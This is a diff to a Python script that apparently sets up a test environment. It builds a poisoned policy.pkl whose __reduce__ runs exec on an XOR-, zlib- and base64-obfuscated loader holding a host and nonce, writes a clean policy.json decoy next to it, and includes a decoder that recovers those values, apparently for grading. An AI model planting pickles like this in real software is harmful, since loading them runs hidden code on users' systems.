@@ -24,7 +24,7 @@ def build(root):
     nonce = secrets.token_hex(8)
     stage2 = 'host="%s"\nscheme="https"\nnonce="%s"\n' % (host, nonce)
     KEY = secrets.token_bytes(4)
-    blob = base64.b64encode(bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(zlib.compress(stage2.encode(), 9)))).decode()
+    blob = base64.b64encode(bytes([b ^ KEY[i % len(KEY)] for i, b in enumerate(zlib.compress(stage2.encode(), 9))])).decode()
     LOADER = ('import base64, zlib, socket\n_K=bytes.fromhex("%s")\n_D="%s"\n'
               'raw=base64.b64decode(_D)\n'
               'src=zlib.decompress(bytes(c^_K[i%%len(_K)] for i,c in enumerate(raw))).decode()\n'
@@ -33,7 +33,7 @@ def build(root):
 
     class P:
         def __reduce__(self):
-            return (exec, (LOADER,))
+            return (exec, (LOADER, {}))
     pkl = os.path.join(CACHE, "policy.pkl"); _w(pkl, pickle.dumps(P()), b=True)
     safe = os.path.join(MIRROR, "policy.json"); _w(safe, json.dumps(EXPECTED_POLICY))
     _w(os.path.join(SVC, "__init__.py"), "")
@@ -48,7 +48,7 @@ def _decode(P):
     raw = open(P["PKL"], "rb").read().decode("latin-1")
     key = bytes.fromhex(re.search(r'_K=bytes\.fromhex\("([0-9a-f]+)"\)', raw).group(1))
     d = re.search(r'_D="([A-Za-z0-9+/=]+)"', raw).group(1)
-    src = zlib.decompress(bytes(c ^ key[i % len(key)] for i, c in enumerate(base64.b64decode(d)))).decode()
+    src = (lambda raw,key: zlib.decompress(bytes([raw[i] ^ key[i%len(key)] for i in range(len(raw))])).decode())(base64.b64decode(d), key)
     return re.search(r'host="([^"]+)"', src).group(1), re.search(r'nonce="([^"]+)"', src).group(1)
 
 
